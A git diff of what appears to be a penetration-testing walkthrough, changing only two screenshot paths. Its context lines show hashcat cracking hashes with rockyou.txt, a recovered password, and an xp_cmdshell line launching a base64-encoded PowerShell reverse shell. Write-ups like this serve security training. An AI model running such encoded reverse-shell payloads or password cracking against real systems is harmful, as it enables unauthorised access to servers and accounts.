@@ -298,7 +298,7 @@ Syntax:
 .\hashcat.exe hashes.txt .\rockyou.txt --show
 ```
 
-<figure><img src="../../../.gitbook/assets/image (4) (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 * We are <mark style="color:green;">successful</mark> and get a password of <mark style="color:yellow;">Pegasus60</mark>
 
@@ -438,7 +438,7 @@ xp_cmdshell powershell -env JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0
 
 * You now have a reverse shell!
 
-<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (6) (2).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
